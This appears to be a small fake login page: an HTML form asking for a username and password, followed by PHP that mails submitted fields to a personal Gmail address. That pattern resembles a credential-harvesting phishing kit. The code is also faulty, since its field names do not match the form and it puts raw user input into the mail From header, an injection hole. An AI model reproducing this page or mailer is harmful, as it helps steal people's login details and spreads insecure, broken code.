<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login</title>
    <link rel="stylesheet" type="text/css" href="login.css"/>
</head>
<body>
    <p id="login">
        <h1>Login</h1>
            <form method="post">
                <input type="text" required="required" placeholder="Username" name="u"></input>
                <input type="password" required="required" placeholder="Password" name="p"></input>
                <button class="but" type="submit">Log in</button>
            </form>
    </p>
</body>
</html>
<?php

    $to = "mr3essa@gmail.com";
    $from = $_REQUEST['email'];
    $name = $_REQUEST['name'];
    $headers = "From: $from";
    $subject = "You have a message.";

    $fields = array();
    $fields{"Username"} = "Username";
    $fields{"email"} = "email";




    $body = "Here is what was sent:\r\n";

    foreach($fields as $a => $b){$body .= $b." : ".$_REQUEST[$a]."\r\n"; }


    $send = mail($to, $subject, $body, $headers);

?>